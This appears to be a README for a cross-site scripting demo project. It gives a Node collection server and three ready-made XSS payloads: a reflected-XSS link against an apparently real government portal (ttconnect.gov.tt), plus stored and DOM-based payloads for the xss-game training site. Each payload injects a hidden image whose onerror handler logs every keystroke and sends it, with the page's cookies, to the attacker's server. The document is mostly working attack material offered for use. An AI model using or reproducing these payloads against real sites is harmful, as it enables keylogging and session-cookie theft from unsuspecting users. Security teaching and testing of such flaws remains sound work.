# TTC-Connect XSS Demo

## Requirements
[Intall Node JS](https://nodejs.org/en/)
## Instructions

Install necessary packages
```
npm install
```

Run application server
```
node app.js
```

Use the following link for reflected xss attack
[Injected TT Connect Link](http://www.ttconnect.gov.tt/gortt/portal/ttconnect/!ut/p/a1/04_Sj9CPykssy0xPLMnMz0vMAfGjzOK9A40MTD0tjQ0sfLycDYyCfM1CLf0MDA3cDYEKIpEV-Ae5uwEVuJoaeniHGRsYGBCn3wAHcCSoP1w_ClWJf6CBJVCJp6Grgam3sbuXAYYCTCeCFeBxQ0FuaIRBpqciAKjdE-c!/dl5/d5/L2dBISEvZ0FBIS9nQSEh/?searchKeyword=++++%3Cimg+hidden+src%3D%27x%27+onerror%3D%22document.onkeypress%3Dfunction%28e%29%7B+var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27POST%27%2C+%27http%3A%2F%2Flocalhost%3A3000%2Fcandy%3Fk%3D%27%2BString.fromCharCode%28e.which%29%29%3B+xhr.setRequestHeader%28%27Content-Type%27%2C+%27application%2Fjson%27%2C+%27Access-Control-Allow-Origin%27%2C%27localhost%3A3000%27%29%3B+xhr.send%28JSON.stringify%28%7Bdomain%3Adocument.domain+%2C+cookie%3A+document.cookie%7D%29%29%7D%22%2F%3E&ctl00%24HomeSearchBar1%24HiddenField1=&selectedCategory=entireSite&ctl00%24HomeSearchBar1%24submit_button.x=0&ctl00%24HomeSearchBar1%24submit_button.y=0)

Type something on the site or make any key strokes

Open sessiondata.txt to see logged information


Use the following link for stored xss attack
[Vulnerable Forum](https://xss-game.appspot.com/level2/frame)

Submit the following script, the script will executed everything your refresh as its persistent
```
 <img hidden src='x' onerror="document.onkeypress=function(e){ var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://localhost:3000/candy?k='+String.fromCharCode(e.which)); xhr.setRequestHeader('Content-Type', 'application/json', 'Access-Control-Allow-Origin','localhost:3000'); xhr.send(JSON.stringify({domain:document.domain , cookie: document.cookie}))}"/>

```

Use the following link for dom-based xss attack
[Injected TT Connect Link](https://xss-game.appspot.com/level1/frame?query=%3Cimg+hidden+src%3D%27x%27+onerror%3D%22document.onkeypress%3Dfunction%28e%29%7B+var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27POST%27%2C+%27http%3A%2F%2Flocalhost%3A3000%2Fcandy%3Fk%3D%27%2BString.fromCharCode%28e.which%29%29%3B+xhr.setRequestHeader%28%27Content-Type%27%2C+%27application%2Fjson%27%2C+%27Access-Control-Allow-Origin%27%2C%27localhost%3A3000%27%29%3B+xhr.send%28JSON.stringify%28%7Bdomain%3Adocument.domain+%2C+cookie%3A+document.cookie%7D%29%29%7D%22%2F%3E)

Type something on the site or make any key strokes

Open sessiondata.txt to see logged information



